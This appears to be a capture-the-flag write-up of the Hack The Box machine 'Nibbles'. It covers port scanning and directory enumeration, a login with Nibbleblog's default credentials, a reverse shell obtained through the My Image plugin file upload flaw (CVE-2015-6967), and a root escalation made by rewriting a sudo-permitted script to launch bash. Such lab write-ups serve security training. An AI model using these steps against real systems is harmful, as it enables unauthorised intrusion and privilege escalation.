### Initial Scan
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-18 11:41 +0200
Nmap scan report for 10.129.96.84
Host is up (0.036s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.28 seconds
```

### Enumeration
My initial enumerating did not yield any intersting results. However in the source code of `index.html` there is a comment to a specific directory:
```html
|   |
|---|
|<b>Hello world!</b>|
||
||
||
||
||
||
||
||
||
||
||
||
||
||
|<!-- /nibbleblog/ directory. Nothing interesting here! -->|
```

```
ffuf -u "http://$IP/nibbleblog/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.96.84/nibbleblog/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

content                 [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 27ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 119ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 128ms]
#                       [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 134ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 133ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 134ms]
#                       [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 138ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 141ms]
# on at least 2 different hosts [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 142ms]
# Copyright 2007 James Fisher [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 145ms]
                        [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 144ms]
#                       [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 147ms]
#                       [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 148ms]
# Priority ordered case-sensitive list, where entries were found [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 148ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 150ms]
themes                  [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 25ms]
admin                   [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 23ms]
plugins                 [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 28ms]
README                  [Status: 200, Size: 4628, Words: 589, Lines: 64, Duration: 39ms]
languages               [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 22ms]
                        [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 32ms]
:: Progress: [220559/220559] :: Job [1/1] :: 1183 req/sec :: Duration: [0:03:03] :: Errors: 0 ::
```

Enumeration on this directory reveals a README, where we can fingerprint the version:
```
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
```
Also, after some reserach, Nibbleblog has a XML file where we can enumerate users:
```
http://10.129.96.84/nibbleblog/content/private/users.xml

<users>

<user username="admin">
	<id type="integer">0</id>
	<session_fail_count type="integer">0</session_fail_count>
	<session_date type="integer">1514544131</session_date>
</user>

<blacklist type="string" ip="10.10.10.1">
	<date type="integer">1512964659</date>
	<fail_count type="integer">1</fail_count>
</blacklist>

</users>
```

So before I would try brute-forcing the login for the admin user, I tried the default credentials `admin:nibbles`, which actually worked here. We now have access to the blog.


### Exploitation
For this version of Nibblesblog, there is a Arbitrary File Upload vulnerability: `https://www.exploit-db.com/exploits/38489`

I could use the metasploit module here, but I'd rather pop the rev shell myself, so I actually let ChatGPT explain to me how the CVE works in detail. The arbitrary File Upload vulnerability is in the MyImage plugin and results into a Remote Code Execution. This was the answer it gave to my prompt asking, where the actual upload happens.
```
After logging in at `/nibbleblog/admin.php`:

1. Look at the **left-hand admin menu**.
    
2. Go to **Plugins**.
    
3. Find **My Image** and open it.
    
4. The **My Image** plugin page contains the image upload functionality.
    
5. That's the upload mechanism affected by **CVE-2015-6967**. The vulnerability specifically concerns unrestricted uploads through that plugin.
```

Visiting the directory `/nibbleblog/content/private/plugins/my_image/` now shows that I successfully uplaoded the rev shell. After opening it, I was able to gain a shell on target system and retrieve the user flag.

![[htb/easy/nibbles/revshell.png]]

### Post Exploitation
`sudo -l` reveals that the `nibbler` user is allowed to run a script with sudo privileges.
```
nibbler@Nibbles:/home/nibbler$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

```

Since we have write access to the home directory, we can just rewrite the script to invoke a shell:
```bash
#!/bin/bash
bash
```

Running this with `sudo` rights will invoke a root shell.

![[htb/easy/nibbles/root.png]]